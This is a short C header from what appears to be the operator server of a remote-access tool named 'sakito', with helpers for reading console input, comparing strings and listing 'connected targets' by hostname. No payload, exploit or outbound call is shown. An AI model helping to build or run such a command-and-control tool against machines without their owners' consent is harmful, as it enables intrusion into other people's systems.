/* 
Coded by d4rkstat1c.
Use educationally/legally.
*/
#ifndef SAKITO_SERVER_TOOLS_H
#define SAKITO_SERVER_TOOLS_H

#define FILE_NOT_FOUND 1

// Function to read/store stdin in buffer until \n is detected.
size_t get_line(char* const buf) {
	size_t cmd_len = 0;
	char c;

	while ((c = getchar()) != '\n' && cmd_len < BUFLEN)
		buf[cmd_len++] = c;

	return cmd_len;
}

// Function to compare two strings (combined logic of strcmp and strncmp).
int compare(const char* buf, const char* str) {
	for (int j = 0; str[j] != '\0'; j++)
		if (str[j] != buf[j])
			return 0;

	return 1;
}

// Function to list/print all available connections to stdout.
void list_connections(const Conn_map* conns) {
	printf("\n\n---------------------------\n");
	printf("---  C0NNECTED TARGETS  ---\n");
	printf("--     Hostname: ID      --\n");
	printf("---------------------------\n\n");

	if (conns->size) {
		for (size_t i = 0; i < conns->size; i++)
			printf("%s: %lu\n", conns->clients[i].host, i);
		printf("\n\n");
	}
	else {
		printf("No connected targets available.\n\n\n");
	}
}


#endif
